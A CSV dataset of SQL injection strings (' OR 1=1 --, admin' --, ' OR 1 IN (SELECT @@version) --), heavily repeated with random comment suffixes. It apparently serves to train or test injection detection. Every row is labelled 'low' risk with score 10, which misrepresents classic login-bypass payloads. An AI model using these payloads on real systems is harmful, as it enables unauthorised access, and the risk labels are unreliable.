query,risk,score
' || 1=1 --,low,10
' OR 'a'='a,low,10
' OR 'x'='x,low,10
' OR 1=1 --,low,10
""" OR ""1""=""1",low,10
' OR 'a'='a,low,10
' OR 'x'='x,low,10
' or 'a'='a,low,10
' || 1=1 --,low,10
' OR 1=1 --,low,10
1' OR '1'='1,low,10
admin' --,low,10
' OR 'a'='a,low,10
1' or 1=1 --,low,10
admin' --,low,10
1' or true --,low,10
' or 'a'='a,low,10
admin' --,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
' OR 'a'='a,low,10
1' or 1=1 --,low,10
admin' --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 1=1 --,low,10
1' or true --,low,10
' OR 'x'='x,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' --,low,10
1' or '1'='1,low,10
' || 1=1 --,low,10
' or 'a'='a,low,10
' OR 'a'='a,low,10
1' or true --,low,10
' || 1=1 --,low,10
' || 1=1 --,low,10
admin' --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or '1'='1,low,10
1' OR '1'='1,low,10
admin' --,low,10
' || 1=1 --,low,10
admin' --,low,10
' or 'a'='a,low,10
' || 1=1 --,low,10
admin' /**/,low,10
' OR 'x'='x,low,10
admin' --,low,10
admin' /**/,low,10
admin' /**/,low,10
admin' --,low,10
' OR 'x'='x,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
1' or 1=1 --,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' /**/,low,10
' OR 'x'='x,low,10
' or 'a'='a,low,10
admin' /**/,low,10
admin' /**/,low,10
' OR 1=1 --,low,10
admin' /**/,low,10
admin' --,low,10
1' or '1'='1,low,10
1' or true --,low,10
1' or 1=1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
""" OR ""1""=""1",low,10
1' or '1'='1,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
1' or 1=1 --,low,10
1' or '1'='1,low,10
admin' /**/,low,10
1' or 1=1 --,low,10
""" OR ""1""=""1",low,10
admin' /**/,low,10
1' or '1'='1,low,10
""" OR ""1""=""1",low,10
admin' --,low,10
1' or true --,low,10
' OR 1=1 --,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' /**/,low,10
admin' --,low,10
admin' --,low,10
1' or '1'='1,low,10
1' OR '1'='1,low,10
' || 1=1 --,low,10
""" OR ""1""=""1",low,10
""" OR ""1""=""1",low,10
' OR 'a'='a,low,10
""" OR ""1""=""1",low,10
' OR 'x'='x,low,10
' OR 'x'='x,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' /**/,low,10
' || 1=1 --,low,10
admin' /**/,low,10
' OR 1=1 --,low,10
admin' /**/,low,10
admin' --,low,10
1' or '1'='1,low,10
1' or 1=1 --,low,10
' OR 1=1 --,low,10
' or 'a'='a,low,10
' OR 'x'='x,low,10
1' or '1'='1,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
admin' /**/,low,10
' OR 1=1 --,low,10
' OR 'a'='a,low,10
admin' /**/,low,10
admin' --,low,10
admin' --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or true --,low,10
admin' --,low,10
' OR 'x'='x,low,10
1' or '1'='1,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
' || 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' OR '1'='1,low,10
admin' --,low,10
1' or 1=1 --,low,10
admin' --,low,10
1' or 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or '1'='1,low,10
' or 'a'='a,low,10
""" OR ""1""=""1",low,10
1' OR '1'='1,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 --,low,10
admin' --,low,10
1' or 1=1 --,low,10
admin' --,low,10
' OR 1=1 --,low,10
""" OR ""1""=""1",low,10
' OR 'a'='a,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or 1=1 --,low,10
admin' --,low,10
admin' --,low,10
admin' /**/,low,10
admin' --,low,10
admin' /**/,low,10
admin' /**/,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
""" OR ""1""=""1",low,10
1' OR '1'='1,low,10
' OR 1=1 LIMIT 1 --,low,10
""" OR ""1""=""1",low,10
1' or true --,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
' || 1=1 --,low,10
' || 1=1 --,low,10
' OR 'x'='x,low,10
' || 1=1 --,low,10
' || 1=1 --,low,10
admin' --,low,10
' || 1=1 --,low,10
' or 'a'='a,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
1' or 1=1 --,low,10
' || 1=1 --,low,10
' OR 'x'='x,low,10
1' or 1=1 --,low,10
' or 'a'='a,low,10
admin' --,low,10
1' or '1'='1,low,10
1' or '1'='1,low,10
1' or true --,low,10
' OR 'x'='x,low,10
1' or 1=1 --,low,10
' OR 1=1 --,low,10
1' or true --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' /**/,low,10
1' or '1'='1,low,10
1' or true --,low,10
1' or 1=1 --,low,10
' OR 'x'='x,low,10
1' or 1=1 --,low,10
' OR 'x'='x,low,10
' || 1=1 --,low,10
' OR 1=1 --,low,10
1' or true --,low,10
' OR 'x'='x,low,10
admin' /**/,low,10
1' or '1'='1,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
1' or true --,low,10
1' or true --,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' or 'a'='a,low,10
1' OR '1'='1,low,10
' or 'a'='a,low,10
' or 'a'='a,low,10
admin' /**/,low,10
1' or true --,low,10
1' or true --,low,10
""" OR ""1""=""1",low,10
' or 'a'='a,low,10
1' or '1'='1,low,10
' OR 1=1 --,low,10
""" OR ""1""=""1",low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 'a'='a,low,10
' or 'a'='a,low,10
' or 'a'='a,low,10
admin' /**/,low,10
' OR 'x'='x,low,10
' OR 'a'='a,low,10
' OR 1=1 --,low,10
' or 'a'='a,low,10
1' or true --,low,10
' or 'a'='a,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or '1'='1,low,10
' || 1=1 --,low,10
""" OR ""1""=""1",low,10
' || 1=1 --,low,10
' || 1=1 --,low,10
""" OR ""1""=""1",low,10
1' or '1'='1,low,10
' or 'a'='a,low,10
' OR 'a'='a,low,10
1' or '1'='1,low,10
1' OR '1'='1,low,10
admin' --,low,10
' OR 'a'='a,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
1' or 1=1 --,low,10
' OR 'a'='a,low,10
1' or true --,low,10
admin' --,low,10
admin' --,low,10
' || 1=1 --,low,10
""" OR ""1""=""1",low,10
' OR 'x'='x,low,10
' || 1=1 --,low,10
' or 'a'='a,low,10
1' or true --,low,10
1' or 1=1 --,low,10
' || 1=1 --,low,10
""" OR ""1""=""1",low,10
1' OR '1'='1,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
' OR 'a'='a,low,10
' || 1=1 --,low,10
admin' --,low,10
1' or 1=1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or true --,low,10
' OR 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or true --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' || 1=1 --,low,10
admin' /**/,low,10
' OR 'x'='x,low,10
' || 1=1 --,low,10
admin' --,low,10
1' or true --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or '1'='1,low,10
admin' --,low,10
admin' /**/,low,10
admin' /**/,low,10
1' or true --,low,10
admin' --,low,10
' OR 'x'='x,low,10
' OR 'a'='a,low,10
admin' --,low,10
admin' /**/,low,10
admin' /**/,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
' OR 'a'='a,low,10
' || 1=1 --,low,10
1' or true --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' || 1=1 --,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
1' or true --,low,10
' || 1=1 --,low,10
' OR 'a'='a,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or 1=1 --,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
""" OR ""1""=""1",low,10
1' or 1=1 --,low,10
' OR 1=1 --,low,10
' || 1=1 --,low,10
1' or true --,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
1' or 1=1 --,low,10
1' OR '1'='1,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
' || 1=1 --,low,10
1' OR '1'='1,low,10
1' or 1=1 --,low,10
' OR 'a'='a,low,10
admin' --,low,10
1' OR '1'='1,low,10
admin' --,low,10
1' or 1=1 --,low,10
1' OR '1'='1,low,10
' || 1=1 --,low,10
' OR 1=1 --,low,10
1' or '1'='1,low,10
' || 1=1 --,low,10
1' or '1'='1,low,10
' OR 'x'='x,low,10
1' or true --,low,10
1' or 1=1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' OR '1'='1,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or 1=1 --,low,10
1' or true --,low,10
admin' --,low,10
1' or '1'='1,low,10
admin' --,low,10
1' or '1'='1,low,10
1' or '1'='1,low,10
1' or '1'='1,low,10
1' OR '1'='1,low,10
admin' /**/,low,10
' || 1=1 --,low,10
' OR 'x'='x,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' /**/,low,10
admin' --,low,10
' || 1=1 --,low,10
""" OR ""1""=""1",low,10
""" OR ""1""=""1",low,10
admin' /**/,low,10
' or 'a'='a,low,10
""" OR ""1""=""1",low,10
""" OR ""1""=""1",low,10
' OR 'x'='x,low,10
1' or true --,low,10
' or 'a'='a,low,10
1' or 1=1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 'a'='a,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
' OR 'x'='x,low,10
1' or '1'='1,low,10
1' or '1'='1,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 'x'='x,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 'x'='x,low,10
1' or '1'='1,low,10
admin' --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 'x'='x,low,10
1' or true --,low,10
' OR 1=1 --,low,10
1' OR '1'='1,low,10
admin' --,low,10
' OR 'x'='x,low,10
1' or 1=1 --,low,10
' || 1=1 --,low,10
""" OR ""1""=""1",low,10
' or 'a'='a,low,10
1' or true --,low,10
' or 'a'='a,low,10
""" OR ""1""=""1",low,10
admin' /**/,low,10
' OR 1 IN (SELECT @@version) --,low,10
' || 1=1 --,low,10
admin' --,low,10
1' or '1'='1,low,10
' OR 'x'='x,low,10
1' or 1=1 --,low,10
' or 'a'='a,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
1' or true --,low,10
admin' --,low,10
' OR 1=1 --,low,10
admin' /**/,low,10
' or 'a'='a,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
""" OR ""1""=""1",low,10
' OR 1=1 --,low,10
admin' --,low,10
' OR 'a'='a,low,10
admin' --,low,10
1' or 1=1 --,low,10
' OR 'x'='x,low,10
' OR 1=1 LIMIT 1 --,low,10
' or 'a'='a,low,10
1' OR '1'='1,low,10
1' or 1=1 --,low,10
1' OR '1'='1,low,10
' OR 'x'='x,low,10
' OR 1=1 --,low,10
' || 1=1 --,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
""" OR ""1""=""1",low,10
' OR 'x'='x,low,10
' OR 1=1 --,low,10
admin' --,low,10
' OR 'a'='a,low,10
1' or 1=1 --,low,10
1' or '1'='1,low,10
1' or '1'='1,low,10
admin' /**/,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or true --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' or 'a'='a,low,10
admin' /**/,low,10
' OR 'a'='a,low,10
1' or true --,low,10
' or 'a'='a,low,10
' or 'a'='a,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' /**/,low,10
admin' --,low,10
1' OR '1'='1,low,10
1' or true --,low,10
admin' --,low,10
1' or 1=1 --,low,10
""" OR ""1""=""1",low,10
' OR 'x'='x,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or true --,low,10
admin' /**/,low,10
1' or 1=1 --,low,10
' OR 'x'='x,low,10
' or 'a'='a,low,10
1' or 1=1 --,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' OR '1'='1,low,10
' || 1=1 --,low,10
""" OR ""1""=""1",low,10
' OR 1=1 --,low,10
1' OR '1'='1,low,10
' OR 1=1 LIMIT 1 --,low,10
""" OR ""1""=""1",low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' OR '1'='1,low,10
' or 'a'='a,low,10
""" OR ""1""=""1",low,10
' OR 1=1 LIMIT 1 --,low,10
1' or '1'='1,low,10
1' OR '1'='1,low,10
admin' /**/,low,10
1' or '1'='1,low,10
1' or '1'='1,low,10
' or 'a'='a,low,10
""" OR ""1""=""1",low,10
1' or 1=1 --,low,10
' OR 1=1 --,low,10
1' or '1'='1,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' /**/,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or true --,low,10
admin' /**/,low,10
' || 1=1 --,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 --,low,10
' || 1=1 --,low,10
1' or true --,low,10
1' or '1'='1,low,10
' OR 'a'='a,low,10
' or 'a'='a,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' /**/,low,10
admin' /**/,low,10
' OR 1=1 --,low,10
' OR 'a'='a,low,10
admin' --,low,10
1' or 1=1 --,low,10
' or 'a'='a,low,10
' or 'a'='a,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' --,low,10
1' or 1=1 --,low,10
' OR 'a'='a,low,10
' || 1=1 --,low,10
1' or '1'='1,low,10
admin' --,low,10
' OR 1=1 --,low,10
' or 'a'='a,low,10
1' or '1'='1,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' /**/,low,10
admin' --,low,10
admin' --,low,10
admin' --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 1=1 --,low,10
' or 'a'='a,low,10
1' or '1'='1,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' --,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' /**/,low,10
1' or true --,low,10
' || 1=1 --,low,10
1' or '1'='1,low,10
' OR 1=1 LIMIT 1 --,low,10
' || 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' /**/,low,10
""" OR ""1""=""1",low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or '1'='1,low,10
1' or 1=1 --,low,10
' OR 'x'='x,low,10
1' OR '1'='1,low,10
1' or '1'='1,low,10
' OR 1=1 LIMIT 1 --,low,10
1' OR '1'='1,low,10
1' or true --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or '1'='1,low,10
' OR 1=1 --,low,10
' or 'a'='a,low,10
""" OR ""1""=""1",low,10
1' or '1'='1,low,10
' OR 'x'='x,low,10
' OR 1=1 --,low,10
1' OR '1'='1,low,10
' or 'a'='a,low,10
' OR 'a'='a,low,10
1' or true --,low,10
' OR 'x'='x,low,10
1' or 1=1 --,low,10
admin' --,low,10
1' or 1=1 --,low,10
1' OR '1'='1,low,10
1' or true --,low,10
' OR 'a'='a,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 'x'='x,low,10
admin' --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
1' or true --,low,10
' OR 'x'='x,low,10
' OR 'a'='a,low,10
admin' --,low,10
' OR 'a'='a,low,10
' OR 'x'='x,low,10
' OR 1=1 --,low,10
""" OR ""1""=""1",low,10
' OR 'x'='x,low,10
1' or '1'='1,low,10
' OR 1 IN (SELECT @@version) --,low,10
' || 1=1 --,low,10
""" OR ""1""=""1",low,10
""" OR ""1""=""1",low,10
' OR 1=1 LIMIT 1 --,low,10
1' OR '1'='1,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
' || 1=1 --,low,10
' || 1=1 --,low,10
' || 1=1 --,low,10
' OR 'x'='x,low,10
' OR 'x'='x,low,10
' || 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' OR '1'='1,low,10
' || 1=1 --,low,10
1' or 1=1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' --,low,10
' OR 'a'='a,low,10
' OR 1=1 --,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
admin' /**/,low,10
1' or '1'='1,low,10
admin' --,low,10
1' or 1=1 --,low,10
1' OR '1'='1,low,10
' OR 'a'='a,low,10
1' or 1=1 -- -- ,low,10
admin' -- -- ,low,10
' or 'a'='a -- ,low,10
' OR 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- # n,low,10
admin' -- # g,low,10
' OR 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # n,low,10
admin' -- -- ,low,10
' OR 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
' OR 1=1 -- # r,low,10
' OR 'a'='a -- ,low,10
' OR 'a'='a -- ,low,10
admin' -- -- ,low,10
1' or 1=1 -- # r,low,10
' OR 1 IN (SELECT @@version) -- # w,low,10
1' or true -- -- ,low,10
admin' -- -- ,low,10
' OR 1=1 LIMIT 1 -- # z,low,10
1' or true -- -- ,low,10
1' or 1=1 -- # e,low,10
1' OR '1'='1 -- ,low,10
admin' -- # 5,low,10
1' or 1=1 -- # 4,low,10
' or 'a'='a # g,low,10
admin' -- -- ,low,10
1' or '1'='1 -- ,low,10
' OR 'x'='x # u,low,10
1' OR '1'='1 -- ,low,10
1' or true -- -- ,low,10
""" OR ""1""=""1 # x",low,10
' OR 1 IN (SELECT @@version) -- # w,low,10
' || 1=1 -- -- ,low,10
1' or true -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' OR '1'='1 # t,low,10
' OR 'x'='x -- ,low,10
1' or '1'='1 # 6,low,10
' OR 1 IN (SELECT @@version) -- # 2,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' -- # q,low,10
1' or 1=1 -- -- ,low,10
1' or 1=1 -- # j,low,10
' OR 'x'='x -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 LIMIT 1 -- # u,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
""" OR ""1""=""1 # e",low,10
1' or true -- # r,low,10
' OR 'x'='x # b,low,10
""" OR ""1""=""1 -- ",low,10
admin' -- -- ,low,10
' || 1=1 -- -- ,low,10
1' or 1=1 -- # r,low,10
' OR 'x'='x -- ,low,10
' OR 1=1 LIMIT 1 -- # 4,low,10
1' or '1'='1 # t,low,10
1' or 1=1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
1' OR '1'='1 # 1,low,10
1' or 1=1 -- -- ,low,10
admin' -- # m,low,10
""" OR ""1""=""1 # u",low,10
""" OR ""1""=""1 -- ",low,10
admin' -- # f,low,10
1' OR '1'='1 # 3,low,10
' OR 'a'='a # m,low,10
admin' -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 -- # m,low,10
1' or true -- # 0,low,10
admin' -- # v,low,10
' or 'a'='a -- ,low,10
1' or true -- # 3,low,10
' or 'a'='a # 3,low,10
' OR 'a'='a -- ,low,10
' OR 1=1 LIMIT 1 -- # g,low,10
' OR 1=1 -- -- ,low,10
1' or '1'='1 # t,low,10
1' or 1=1 -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' or 'a'='a # t,low,10
' OR 'a'='a -- ,low,10
' || 1=1 -- # 5,low,10
' or 'a'='a # m,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 'x'='x # a,low,10
' || 1=1 -- # 5,low,10
' OR 1=1 -- # m,low,10
' OR 1=1 LIMIT 1 -- # b,low,10
' or 'a'='a # j,low,10
admin' /**/ # d,low,10
admin' /**/ # 2,low,10
1' OR '1'='1 # l,low,10
admin' /**/ # h,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' /**/ -- ,low,10
1' or 1=1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
' or 'a'='a -- ,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' OR '1'='1 # 5,low,10
' OR 'a'='a -- ,low,10
' or 'a'='a # k,low,10
' OR 'x'='x # z,low,10
' OR 1 IN (SELECT @@version) -- # 7,low,10
' OR 'a'='a -- ,low,10
1' or true -- -- ,low,10
1' OR '1'='1 -- ,low,10
1' OR '1'='1 # s,low,10
admin' /**/ -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 'x'='x # 0,low,10
1' or 1=1 -- -- ,low,10
admin' /**/ -- ,low,10
' OR 1=1 -- # h,low,10
1' or 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' OR '1'='1 -- ,low,10
' or 'a'='a # 7,low,10
' OR 'a'='a # y,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
admin' /**/ -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' OR '1'='1 -- ,low,10
1' OR '1'='1 # p,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 -- -- ,low,10
admin' -- # r,low,10
1' or 1=1 -- -- ,low,10
admin' /**/ # j,low,10
1' or true -- # 4,low,10
' OR 'x'='x # q,low,10
admin' -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- # g,low,10
admin' -- -- ,low,10
1' or 1=1 -- # p,low,10
' OR 'x'='x -- ,low,10
1' or '1'='1 # 0,low,10
1' or true -- # t,low,10
""" OR ""1""=""1 # j",low,10
1' OR '1'='1 # h,low,10
1' or true -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
1' OR '1'='1 -- ,low,10
admin' -- # v,low,10
admin' -- -- ,low,10
' || 1=1 -- # 4,low,10
1' or 1=1 -- # 6,low,10
1' OR '1'='1 # z,low,10
' OR 1=1 -- # k,low,10
1' or true -- -- ,low,10
admin' -- -- ,low,10
1' OR '1'='1 # r,low,10
' || 1=1 -- -- ,low,10
1' or true -- # k,low,10
' OR 1=1 LIMIT 1 -- # f,low,10
' || 1=1 -- # z,low,10
admin' -- # 3,low,10
1' or 1=1 -- -- ,low,10
1' or '1'='1 -- ,low,10
1' or '1'='1 # w,low,10
1' or '1'='1 # b,low,10
' or 'a'='a # m,low,10
1' or true -- # y,low,10
' || 1=1 -- -- ,low,10
admin' -- -- ,low,10
' || 1=1 -- -- ,low,10
' or 'a'='a -- ,low,10
admin' /**/ -- ,low,10
' or 'a'='a # 4,low,10
admin' -- # a,low,10
' OR 1=1 -- -- ,low,10
1' or true -- -- ,low,10
1' or 1=1 -- # q,low,10
' or 'a'='a -- ,low,10
1' or '1'='1 -- ,low,10
1' or '1'='1 -- ,low,10
1' or true -- # 2,low,10
' OR 'a'='a # n,low,10
' OR 1=1 -- # o,low,10
""" OR ""1""=""1 # 4",low,10
' || 1=1 -- # n,low,10
' or 'a'='a -- ,low,10
' OR 'x'='x -- ,low,10
admin' -- # j,low,10
' or 'a'='a # d,low,10
' OR 1=1 -- # 7,low,10
""" OR ""1""=""1 # 8",low,10
admin' -- -- ,low,10
1' or 1=1 -- -- ,low,10
admin' -- # b,low,10
1' or 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 'a'='a # q,low,10
' OR 'a'='a # b,low,10
admin' /**/ -- ,low,10
admin' -- -- ,low,10
' OR 1=1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 -- # i,low,10
' OR 1=1 -- -- ,low,10
' OR 'x'='x # w,low,10
""" OR ""1""=""1 # j",low,10
' OR 1 IN (SELECT @@version) -- # f,low,10
1' or '1'='1 -- ,low,10
admin' -- -- ,low,10
' OR 'a'='a # r,low,10
' or 'a'='a -- ,low,10
' or 'a'='a -- ,low,10
' || 1=1 -- -- ,low,10
' or 'a'='a # i,low,10
1' or '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' -- -- ,low,10
admin' -- -- ,low,10
' OR 1=1 -- # o,low,10
' or 'a'='a # a,low,10
' OR 1=1 LIMIT 1 -- # 9,low,10
admin' /**/ -- ,low,10
' OR 'a'='a # l,low,10
' OR 'x'='x # d,low,10
admin' /**/ # t,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or 1=1 -- -- ,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- # g,low,10
1' or true -- # 3,low,10
' OR 1=1 -- -- ,low,10
1' or '1'='1 # m,low,10
1' or 1=1 -- # 2,low,10
' OR 1=1 -- # d,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' or 'a'='a # z,low,10
1' or 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' or 'a'='a # f,low,10
' OR 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' or 'a'='a # e,low,10
admin' -- # 4,low,10
' or 'a'='a # z,low,10
1' or true -- -- ,low,10
1' or 1=1 -- # 8,low,10
' || 1=1 -- -- ,low,10
1' or true -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 'a'='a -- ,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 -- -- ,low,10
1' or 1=1 -- # 8,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1=1 -- -- ,low,10
""" OR ""1""=""1 # e",low,10
1' or '1'='1 -- ,low,10
' or 'a'='a -- ,low,10
' OR 'x'='x -- ,low,10
' OR 1=1 -- # r,low,10
1' OR '1'='1 -- ,low,10
